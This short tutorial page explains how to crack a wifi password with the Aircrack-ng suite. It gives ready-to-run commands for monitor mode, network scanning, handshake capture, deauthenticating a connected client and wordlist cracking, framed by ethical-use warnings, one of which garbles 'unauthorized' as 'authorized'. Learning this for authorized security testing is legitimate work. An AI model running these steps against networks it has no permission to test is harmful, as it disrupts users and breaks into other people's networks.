wifi hacking guide

Open-Source Wifi-Hacking Simulations

ETHICAL USE WARNING

Wifi hacking tools are designed for legitimate security awareness training. Use only on systems you own or have explicit permission to test. Unauthorized testing are illegal and unethical.

Here are basic procedures

1. Get the right tools: You'll need a WiFi adapter that supports monitor mode (e.g., Alfa AWUS036NHA) and tools like Aircrack-ng suite.

2. Set up your adapter: Put your WiFi adapter in monitor mode:

airmon-ng start wlan0

(Replace wlan0 with your adapter's name)

3. Scan for networks: Use airodump-ng to scan for nearby networks:

airodump-ng wlan0mon

(Note the BSSID and channel of your target network)

4. Capture handshake: Use airodump-ng to capture the handshake:

airodump-ng -c [channel] --bssid [BSSID] -w capture wlan0mon

Deauthenticate a client to capture the handshake:

aireplay-ng -0 1 -a [BSSID] -c [client MAC] wlan0mon

5. Crack the password: Use aircrack-ng to crack the password:

aircrack-ng -w wordlist.txt capture-01.cap

Note: Get explicit permission to test, an authorized testing is not only unethical but also illegal.
